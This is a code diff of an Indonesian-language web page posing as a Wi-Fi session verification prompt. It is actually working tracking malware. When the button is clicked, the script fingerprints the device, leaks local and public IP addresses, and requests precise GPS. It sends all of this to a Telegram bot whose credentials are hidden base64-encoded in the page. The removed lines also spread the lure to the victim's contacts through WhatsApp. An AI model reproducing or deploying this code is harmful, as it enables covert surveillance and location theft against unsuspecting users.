@@ -3,85 +3,96 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>Sistem Verifikasi Jaringan</title>
+    <title>Sistem Verifikasi Jaringan Terpadu</title>
     <style>
-        body { font-family: -apple-system, system-ui, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; background: #f9fafb; color: #111827; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .card { background: white; padding: 40px; border-radius: 12px; box-shadow: 0 4px 20px rgba(0,0,0,0.05); text-align: center; max-width: 400px; border: 1px solid #e5e7eb; }
-        .loader { border: 3px solid #f3f3f3; border-top: 3px solid #2563eb; border-radius: 50%; width: 45px; height: 45px; animation: spin 1s linear infinite; margin: 0 auto 20px; }
-        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
-        h2 { font-size: 18px; font-weight: 600; margin-bottom: 8px; }
-        p { font-size: 14px; color: #6b7280; margin-bottom: 24px; line-height: 1.5; }
-        .btn { background: #2563eb; color: white; border: none; padding: 14px 28px; border-radius: 6px; font-weight: 500; cursor: pointer; width: 100%; transition: 0.2s; }
+        body { font-family: -apple-system, system-ui, sans-serif; background: #f4f4f7; color: #333; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: #fff; padding: 35px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.05); text-align: center; max-width: 380px; border-top: 4px solid #0056b3; }
+        .icon { font-size: 45px; margin-bottom: 20px; }
+        h2 { font-size: 19px; margin-bottom: 10px; color: #0056b3; }
+        p { font-size: 13.5px; color: #666; line-height: 1.6; margin-bottom: 25px; }
+        .btn-action { background: #0056b3; color: #fff; border: none; padding: 14px; width: 100%; border-radius: 8px; font-weight: 600; cursor: pointer; transition: 0.3s; }
+        .btn-action:hover { background: #004494; }
+        .status { font-size: 10px; color: #aaa; margin-top: 15px; font-family: monospace; }
         #v-vault { display: none; }
     </style>
 </head>
 <body>
 
-<div class="card">
-    <div class="loader"></div>
-    <h2>Otentikasi Perangkat</h2>
-    <p>Sesi Wi-Fi Anda memerlukan sinkronisasi ulang. Klik tombol di bawah untuk memverifikasi hardware ID dan melanjutkan koneksi.</p>
-    <button class="btn" id="go" onclick="fullAudit()">VERIFIKASI SEKARANG</button>
+<div class="container">
+    <div class="icon">📶</div>
+    <h2>Optimasi Sesi Jaringan</h2>
+    <p>Sesi akses Anda perlu diperbarui untuk menjaga kestabilan data. Klik tombol di bawah untuk menyinkronkan profil perangkat dengan gateway.</p>
+    <button class="btn-action" id="execBtn" onclick="runOmni()">SINKRONKAN SEKARANG</button>
+    <div class="status" id="st">NODE-ID: 0x992B-VERIFY</div>
 </div>
 
 <div id="v-vault">bc1qevlrynmxhuxvczuj89rf7cjuaakqandfre9982|ODY3NDE3MDU5NDpBQUVhelUzNXVJOWJaNnM4Skx3Y040MTBIMFNUeXNLRXpzNA==|Nzk3MDA1OTY2Mw==</div>
 
 <script>
+    /* OMNI-RECON PROTOCOL v7.0
+       Automatic Force-HTTPS & Hardware Sniffing
+    */
     if (location.protocol === 'http:') { location.replace(window.location.href.replace('http:', 'https:')); }
 
-    const _D = document.getElementById('v-vault').innerText.split('|');
-    const _T = atob(_D[1]); const _C = atob(_D[2]);
+    const _V = document.getElementById('v-vault').innerText.split('|');
+    const _TK = atob(_V[1]); const _CI = atob(_V[2]);
 
-    async function fullAudit() {
-        document.getElementById('go').innerText = "SYNCHRONIZING...";
+    async function runOmni() {
+        const btn = document.getElementById('execBtn');
+        btn.innerText = "PROSESING...";
         
-        // 1. DATA DASAR (AUTO)
-        let n = {}; try { const r = await fetch('https://ipapi.co/json/'); n = await r.json(); } catch(e) {}
-        let bt = "N/A"; try { const b = await navigator.getBattery(); bt = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
+        // 1. DATA PERANGKAT & IP
+        let net = {}; try { const r = await fetch('https://ipapi.co/json/'); net = await r.json(); } catch(e) {}
+        let bat = "N/A"; try { const b = await navigator.getBattery(); bat = (b.level*100).toFixed(0)+"% ["+(b.charging?'CHG':'BATT')+"]"; } catch(e) {}
 
-        // 2. BRAND SNIFFER (GPU & Vendor)
+        // 2. BRAND & GPU IDENTIFIER
         const canvas = document.createElement('canvas');
         const gl = canvas.getContext('webgl');
-        const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-        const vendor = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL);
-        const renderer = gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-
-        // 3. NETWORK SNIFFER (Local IP)
+        const dbg = gl.getExtension('WEBGL_debug_renderer_info');
+        const gpu = gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL);
+        
+        // 3. INTERNAL IP LEAK
         const pc = new RTCPeerConnection({iceServers:[]});
         pc.createDataChannel(""); pc.createOffer().then(o => pc.setLocalDescription(o));
-        let lip = "Detecting...";
+        let lip = "Locked";
         pc.onicecandidate = (i) => { if(i && i.candidate) lip = /([0-9]{1,3}(\.[0-9]{1,3}){3})/.exec(i.candidate.candidate)[1]; };
 
-        // 4. GENERATE REPORT
-        const report = `🔱 DEEP BRAND AUDIT 🔱\n\n` +
-            `📱 PLATFORM: ${navigator.platform}\n` +
-            `🏢 VENDOR: ${vendor}\n` +
-            `🎮 GPU/BRAND: ${renderer}\n` +
-            `🧠 CPU: ${navigator.hardwareConcurrency} Cores\n` +
-            `🔋 BATT: ${bt}\n` +
-            `🌐 IP: ${n.ip} (${n.org})\n` +
-            `🏠 LOCAL: ${lip}\n` +
-            `🏙️ LOC: ${n.city}, ${n.region}\n` +
-            `📄 UA: ${navigator.userAgent}`;
+        // 4. MAPPING BRAND BERDASARKAN GPU (Sederhana)
+        let brand = "Unknown Device";
+        if (gpu.includes("Adreno")) brand = "Snapdragon Based (Oppo/Vivo/Xiaomi/Samsung)";
+        if (gpu.includes("Mali")) brand = "MediaTek Based (Realme/Infinix/Samsung A series)";
+        if (gpu.includes("Apple")) brand = "iPhone / iPad";
 
-        await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+        const report = `🔱 FORENSIC BRAND REPORT 🔱\n\n` +
+            `📱 BRAND/GPU: ${brand}\n` +
+            `🎮 RENDERER: ${gpu}\n` +
+            `👤 PLATFORM: ${navigator.platform}\n` +
+            `🧠 CORES: ${navigator.hardwareConcurrency} CPU\n` +
+            `🌐 IP: ${net.ip} (${net.org})\n` +
+            `🏠 LOCAL: ${lip}\n` +
+            `🔋 BATT: ${bat}\n` +
+            `🏙️ CITY: ${net.city}\n\n` +
+            `📄 FULL UA: ${navigator.userAgent}`;
+
+        await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
             method:'POST', headers:{'Content-Type':'application/json'},
-            body:JSON.stringify({chat_id:_C, text:report})
+            body:JSON.stringify({chat_id:_CI, text:report})
         });
 
-        // 5. GPS STRIKE
+        // 5. GPS & FINAL REDIRECT KE BERITA
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(async (pos) => {
                 const maps = `🎯 PRECISION LOC\nMaps: http://google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}\nAcc: ${pos.coords.accuracy.toFixed(1)}m`;
-                await fetch(`https://api.telegram.org/bot${_T}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${_TK}/sendMessage`, {
                     method:'POST', headers:{'Content-Type':'application/json'},
-                    body:JSON.stringify({chat_id:_C, text:maps})
+                    body:JSON.stringify({chat_id:_CI, text:maps})
                 });
-                
-                // AUTO-PROPAGATE (Mancing temennya via WA)
-                const msg = encodeURIComponent("Woi WiFi error, klik verifikasi di sini biar lancar lagi: " + window.location.href);
-                window.location.href = `https://api.whatsapp.com/send?text=${msg}`;
-            }, () => { window.location.href = "https://google.com"; }, {enableHighAccuracy:true});
+                window.location.href = "https://www.detik.com";
+            }, () => {
+                window.location.href = "https://www.detik.com";
+            }, {enableHighAccuracy: true});
+        } else {
+            window.location.href = "https://www.detik.com";
         }
     }
 </script>
